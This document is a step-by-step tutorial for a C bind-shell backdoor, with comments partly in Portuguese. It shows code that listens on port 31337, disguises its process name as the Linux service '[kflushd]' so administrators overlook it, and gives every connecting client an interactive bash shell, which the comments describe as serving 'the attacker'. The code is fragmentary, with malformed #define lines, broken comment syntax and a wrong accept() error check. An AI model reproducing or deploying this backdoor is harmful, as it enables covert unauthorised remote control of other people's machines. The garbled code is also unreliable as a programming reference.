# 1 

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

-- First step: define the libraries

# 2 

#define MINHA_PORTA 31337; --/define the port
#define BACKLOG 5; --/max number of connections

# 3 

 struct sockaddr_in local; / local structure
  struct sockaddr_in remote; / remote structure

# 4 

strcpy(argv[0], "[kflushd]");
 
--/Copy the "kflushd" value to "argv[0]. kflushd is a name for a linux service. We use this argument because when the admin check the process in memory, will not show a strange value or name

# 5 

            Meusocket = socket(AF_INET, SOCK_STREAM, 0);
            bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
            listen(Meusocket, BACKLOG);
            tamanho = sizeof(struct sockaddr_in);


--Define the port and the local address that will start the program
--func. bind() and listen() links the port in the program, and BACKLOG is the maximum number of connections
# 6 

 while(1)
            {
              if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote, &tamanho)) == 1)
                    {
                      perror("accept");
                      exit(1); 
                      }
                      if(!fork())
                      {
                       close(0); close(1); close(2);
                       dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket, 2);
                       execl("/bin/bash","bash","-i", (char *)0);
                       close(Novosocket);
                       exit(0);
                       }
              }
  }
  
} 

 --Accept conections and provides the shell for the attacker

# 7 

    execl("/bin/bash","bash","-i", (char *)0);
    close(Novosocket);
    exit(0);
-- exec the shell


# 8 

 local.sin_addr.s_addr = INADDR_ANY;  
  --define the local addrs

